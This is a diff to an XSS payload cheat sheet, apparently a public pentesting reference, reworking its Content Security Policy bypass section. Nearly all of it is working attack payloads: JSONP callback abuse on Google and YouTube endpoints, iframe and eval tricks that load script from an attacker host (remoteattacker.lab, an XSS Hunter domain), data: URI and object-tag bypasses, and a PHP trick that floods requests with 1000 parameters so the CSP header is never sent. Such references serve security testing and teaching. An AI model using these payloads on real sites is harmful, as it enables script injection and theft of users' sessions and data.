@@ -76,11 +76,12 @@
     - [Bypass using weird encoding or native interpretation](#bypass-using-weird-encoding-or-native-interpretation)
     - [Bypass using jsfuck](#bypass-using-jsfuck)
   - [CSP Bypass](#csp-bypass)
-    - [Bypass CSP using JSONP from Google (Trick by @apfeifer27)](#bypass-csp-using-jsonp-from-google-trick-by-apfeifer27)
-    - [Bypass CSP by lab.wallarm.com](#bypass-csp-by-labwallarmcom)
-    - [Bypass CSP by Rhynorater](#bypass-csp-by-rhynorater)
-    - [Bypass CSP by @akita_zen](#bypass-csp-by-akita_zen)
-    - [Bypass CSP by @404death](#bypass-csp-by-404death)
+    - [Bypass CSP using JSONP](#bypass-csp-using-jsonp)
+    - [Bypass CSP default-src](#bypass-csp-default-src)
+    - [Bypass CSP inline eval](#bypass-csp-inline-eval)
+    - [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)
+    - [Bypass CSP script-src self](#bypass-csp-script-src-self)
+    - [Bypass CSP script-src data](#bypass-csp-script-src-data)
   - [Common WAF Bypass](#common-waf-bypass)
     - [Cloudflare XSS Bypasses by @Bohdan Korzhynskyi](#cloudflare-xss-bypasses-by-bohdan-korzhynskyi)
       - [25st January 2021](#25st-january-2021)
@@ -1103,50 +1104,136 @@ Bypass using [jsfuck](http://www.jsfuck.com/)
 
 Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://websecblog.com/vulns/google-csp-evaluator/)
 
-### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
 
-//google.com/complete/search?client=chrome&jsonp=alert(1);
+### Bypass CSP using JSONP
+
+**Requirements**:
+
+* CSP: `script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`
+
+**Payload**:
+
+Use a callback function from a whitelisted source listed in the CSP.
+
+* Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`
+* Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
+* Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`
+* Youtube: `https://www.youtube.com/oembed?callback=alert;`
+* [Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
+* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
 
 ```js
 <script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
 ```
 
-More JSONP endpoints:
-* [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
-* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)
 
-### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
+### Bypass CSP default-src
 
-Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)
+**Requirements**:
+
+* CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, 
+
+**Payload**:
+
+`http://example.lab/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;`
 
 ```js
 script=document.createElement('script');
-script.src='//bo0om.ru/csp.js';
+script.src='//remoteattacker.lab/csp.js';
 window.frames[0].document.head.appendChild(script);
 ```
 
-### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
+Source: [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
+
+
+### Bypass CSP inline eval 
+
+**Requirements**:
+
+* CSP `inline` or `eval`
+
+
+**Payload**:
 
 ```js
-// CSP Bypass with Inline and Eval
 d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
 ```
 
-### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
+Source: [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
 
-Works for CSP like `script-src self`
+
+### Bypass CSP script-src self 
+
+**Requirements**:
+
+* CSP like `script-src self`
+
+**Payload**:
 
 ```js
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
 ```
 
-### Bypass CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)
+Source: [@akita_zen](https://twitter.com/akita_zen)
 
-Works for CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
+
+### Bypass CSP script-src data
+
+**Requirements**:
+
+* CSP like `script-src 'self' data:` as warned about in the official [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).
+
+
+**Payload**:
 
 ```javascript
 <script src="data:,alert(1)">/</script>
 ```
+
+Source: [@404death](https://twitter.com/404death/status/1191222237782659072)
+
+
+### Bypass CSP unsafe-inline
+
+**Requirements**:
+
+* CSP: `script-src https://google.com 'unsafe-inline';`
+
+**Payload**:
+
+```javascript
+"/><script>alert(1);</script>
+```
+
+
+### Bypass CSP header sent by PHP
+
+**Requirements**:
+
+* CSP sent by PHP `header()` function 
+
+
+**Payload**:
+
+In default `php:apache` image configuration, PHP cannot modify headers when the response's data has already been written. This event occurs when a warning is raised by PHP engine.
+
+Here are several ways to generate a warning:
+
+- 1000 $_GET parameters
+- 1000 $_POST parameters
+- 20 $_FILES
+
+If the **Warning** are configured to be displayed you should get these:
+
+* **Warning**: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`
+* **Warning**: `Cannot modify header information - headers already sent in /var/www/html/index.php on line 2`
+
+
+```ps1
+GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a
+```
+
+Source: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)
 
 
 ## Common WAF Bypass
@@ -1318,3 +1405,4 @@ anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxld
 - [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
 - [Bypass < with ＜](https://hackerone.com/reports/639684)
 - [Bypassing Signature-Based XSS Filters: Modifying Script Code](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)
+- [Secret Web Hacking Knowledge: CTF Authors Hate These Simple Tricks - Philippe Dourassov - 13 may 2024](https://youtu.be/Sm4G6cAHjWM)
